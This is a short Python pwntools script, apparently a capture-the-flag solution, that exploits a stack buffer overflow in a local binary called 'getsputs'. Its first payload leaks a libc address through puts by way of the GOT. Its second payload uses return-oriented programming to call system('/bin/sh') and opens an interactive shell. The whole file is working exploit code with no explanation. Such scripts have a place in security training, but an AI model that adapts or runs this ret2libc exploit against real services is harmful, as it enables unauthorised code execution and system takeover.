from pwn import *

# context.log_level = "debug"

binary = "./getsputs"
e = ELF(binary)
libc = e.libc
#r = process(binary)
r = remote("localhost", 13281)

rdi = 0x0000000000401176
payload = b""
payload += b"A" * 0x58
payload += p64(rdi) + p64(e.got["puts"]) + p64(e.plt["puts"])
payload += p64(e.symbols["main"])
r.sendline(payload)

l = u64(r.recvuntil(b"\x7f")[-6:] + b"\x00\x00") - libc.symbols["puts"]
log.info("libc base: " + hex(l))

payload = b""
payload += b"A" * 0x58
payload += p64(rdi + 1)
payload += p64(rdi) + p64(l + list(libc.search(b"/bin/sh"))[0]) + p64(l + libc.symbols["system"])
r.sendline(payload)

r.interactive()